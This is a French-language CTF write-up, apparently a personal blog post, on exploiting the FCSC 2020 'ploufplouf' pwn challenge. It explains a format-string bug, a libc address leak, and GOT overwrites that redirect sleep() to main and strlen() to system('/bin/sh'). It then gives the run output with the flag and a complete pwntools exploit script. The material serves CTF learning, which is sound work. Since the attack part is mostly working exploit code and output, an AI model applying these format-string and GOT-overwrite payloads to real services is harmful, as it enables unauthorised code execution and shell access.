---
layout: post  
title: "Challenge ploufplouf, FCSC 2020"
date: 2026-02-20 21:18:27 +0100
categories: CTF
---

[https://hackropole.fr/fr/challenges/pwn/fcsc2020-pwn-plouf-plouf/](https://hackropole.fr/fr/challenges/pwn/fcsc2020-pwn-plouf-plouf/)

Le challenge est un petit jeu qui demande le prénom et donne quelques tentatives pour trouver un chiffre.

Je patch le binaire avec pwninit pour travailler avec la bonne libc.
L'exploit en local utilise ./plouf_patched .

En désassemblant avec binaryninja on s'apercoit vite qu'il y a une faille de format string.
```c
+0x12ce        fgets(buf: &var_a4, n, fp: *stdin)
+0x12eb        var_a4[strlen(&var_a4) - 1] = 0
+0x12fd        printf(format: "Bonjour ")
+0x130f        printf(format: &var_a4)
```

C'est généralement synonyme de leak et d'écriture arbitraire, le binaire n'étant pas FORTIFIED.
La libc utilisée est la 2.28, pas de souci de ce coté là.
Le binaire est PIE, on peut utiliser ses adresses car elles ne changent pas.
Le binaire en lui même ne permet pas d'avoir un shell ou approchant, il nous faudra utiliser la libc.
Pour l'utiliser on va avoir besoin de son adresse en mémoire, qui elle est changeante.

Le plan est le suivant :
- récupérer l'adresse de la libc
- détourner une fonction pour appeler system("/bin/sh")

Au moment du printf la pile contient entre autres le retour à libc_start_main.
Avec un %xxx$p on l'obtient, on peut en déduire la base de la libc.
Le reste du programme ne semble pas avoir de failles utiles.

Il faut donc recommencer le programme sans le relancer pour que la libc ne change pas d'adresse.
Une solution a été d'écraser l'entrée GOT de sleep() avec l'adresse du début du programme.
Pas besoin de leak pour ça, on peut utiliser les adresses fixes du binaire.
Après un jet de caillou dans le jeu, sleep() est appelé.

Au deuxième tour on peut faire une écriture arbitraire, et on a l'adresse de la libc.
J'ai choisi d'écraser l'entrée GOT de strlen() car elle est utilisée avec un buffer que l'on controle.
Je remplace par l'adresse de system().
On relance un caillou, ca appele sleep() qui relance main().

Au troisième tour le jeu redemande notre nom, "/bin/sh", et le passe à strlen-system() 
Et voilà !

```bash
➜  ploufplouf ./exploit.py  REMOTE
[+] Opening connection to localhost on port 4000: Done
[*] will write 0x8049212 at 0x804c014
[+] libc base: 0xf3f3f000
[*] will write 0xf3f7db80 at 0x804c02c
[*] Switching to interactive mode
Linux 9e2e019f87bd 6.8.0-100-generic #100-Ubuntu SMP PREEMPT_DYNAMIC Tue Jan 13 16:40:06 UTC 2026 x86_64 GNU/Linux
FCSC{1f0ab477d3ec9b50c0e1259d8e18f10d47c9c046041ef5fe344c30e0da8dca6c}
```

 \- mandragore, 2026/02/20

```python
#!/usr/bin/env python3

from pwn import *
import re
import sys
import os
sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'i386'

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./plouf_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.28.so', checksec=False)

if args.REMOTE:
    p = remote('localhost', 4000)
else:
    if args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
            # break fgets
            # break printf
            break strlen
            continue
        ''')
    else:
        p = process(elf.path)

p.recvuntil(b'>>> ')

where=elf.got.sleep
what=elf.sym.main
log.info(f'will write {what:#x} at {where:#x}')
what=what & 0xffff
payload=p32(where)
payload+=b'%47$p'
payload+=b'%'+str(what-10-4).encode()+b'c%7$hn'
p.sendline(payload)
leak=p.recvregex(b'(0x.*) ',capture=True).group(1)
libc.address=int(leak,16)-241-libc.sym.__libc_start_main
log.success(f'libc base: {libc.address:#x}')

p.recvuntil(b'>>> ')
p.sendline(b'1') # force du caillou

p.recvuntil(b'>>> ') # back to square one

where=elf.got.strlen
what=libc.sym.system
#what=0xdeadfed5
log.info(f'will write {what:#x} at {where:#x}')
payload=fmtstr_payload(7,{where:what},write_size='byte')
p.sendline(payload)
p.recv(timeout=1)

p.recvuntil(b'>>> ')
p.sendline(b'1')

p.recvuntil(b'>>> ') # back to square one
p.sendline(b'/bin/sh')

p.clean()
p.sendline(b'uname -a;cat flag.txt')
p.interactive()
```
